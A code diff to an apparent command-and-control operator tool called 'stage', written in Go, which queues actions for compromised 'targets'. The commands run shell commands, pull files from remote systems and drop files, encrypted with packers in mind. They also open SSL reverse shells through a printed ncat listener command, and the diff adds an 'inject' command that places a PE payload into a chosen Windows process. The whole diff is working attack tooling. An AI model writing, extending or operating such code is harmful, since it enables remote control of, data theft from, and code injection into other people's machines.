@@ -21,26 +21,37 @@ const (
 )
 
 var (
-	cmdMap    = make(map[string]int)
-	app       = kingpin.New("stage", "stage commands or files for remote systems")
+	cmdMap = make(map[string]int)
+	app    = kingpin.New("stage", "stage commands or files for remote systems")
+
 	file      = app.Command("file", "stage a file")
 	viewFile  = file.Command("view", "view current file stage")
 	serveFile = file.Command("serve", "serve a specified file")
-	encrypt   = serveFile.Flag("encrypt", "file will be written to disk encrypted, ideal if there is a packer on disk").Bool()
 	deleteF   = file.Command("clear", "remove a file from the stage")
-	filename  = serveFile.Arg("filename", "name of file to stage").Required().String()
-	outfile   = serveFile.Arg("outfile", "name of file to write to remote disk").Default("").String()
-	cmd       = app.Command("cmd", "stage a command")
-	exe       = cmd.Command("exec", "execute a shell command on target")
-	get       = cmd.Command("get", "get file(s) from a remote system")
-	revshell  = cmd.Command("revshell", "initiate reverse shell with one remote system")
-	viewCmd   = cmd.Command("view", "view current command stage")
-	deleteC   = cmd.Command("clear", "remove a command from the stage")
+
+	encrypt  = serveFile.Flag("encrypt", "file will be written to disk encrypted, ideal if there is a packer on disk").Bool()
+	filename = serveFile.Arg("filename", "name of file to stage").Required().String()
+	outfile  = serveFile.Arg("outfile", "name of file to write to remote disk").Default("").String()
+
+	cmd      = app.Command("cmd", "stage a command")
+	exe      = cmd.Command("exec", "execute a shell command on target")
+	get      = cmd.Command("get", "get file(s) from a remote system")
+	revshell = cmd.Command("revshell", "initiate reverse shell with one remote system")
+	inject   = cmd.Command("inject", "inject specified PE (e.g. exe) into target process")
+	viewCmd  = cmd.Command("view", "view current command stage")
+	deleteC  = cmd.Command("clear", "remove a command from the stage")
+
 	cmdstring = exe.Arg("command", "command to execute").Required().String()
-	files     = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()
-	lhost     = revshell.Arg("lhost", "host that client connects to").Required().String()
-	lport     = revshell.Arg("lport", "port that client will connect to and server listens on").Required().String()
-	forwho    = app.Flag("for", "name of target to receive command").String()
+
+	files = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()
+
+	lhost = revshell.Arg("lhost", "host that client connects to").Required().String()
+	lport = revshell.Arg("lport", "port that client will connect to and server listens on").Required().String()
+
+	payload = inject.Arg("payload", "path to payload to inject into remote process").Required().String()
+	target  = inject.Arg("target", "path to target process to inject on windows system (e.g. C:\\Path\\To\\Target\\Process.exe)").Required().String()
+
+	forwho = app.Flag("for", "name of target to receive command").String()
 )
 
 func main() {
@@ -65,6 +76,8 @@ func main() {
 		handleCmd(db, "exec")
 	case get.FullCommand():
 		handleCmd(db, "get")
+	case inject.FullCommand():
+		handleCmd(db, "inject")
 	case revshell.FullCommand():
 		if len(*forwho) == 0 {
 			log.Fatal("'for' flag is required to initiate a reverse shell")
@@ -181,10 +194,16 @@ func handleCmd(db *datastore.Kdb, myCmd string) {
 		if err != nil {
 			log.Fatal(err)
 		}
-
 		cmd := fmt.Sprintf("ncat -lnvp %s --ssl-cert %s --ssl-key %s", *lport, crtfile, keyfile)
 		fmt.Println("[+] run in separate terminal window:")
 		fmt.Println(cmd)
+	case "inject":
+		payloadBytes, err := os.ReadFile(*payload)
+		if err != nil {
+			log.Fatal(err)
+		}
+		cmdObj.Args = append(cmdObj.Args, models.MultiType{ByteValue: payloadBytes})
+		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *target})
 	}
 	bytes, err := json.Marshal(cmdObj)
 	if err != nil {
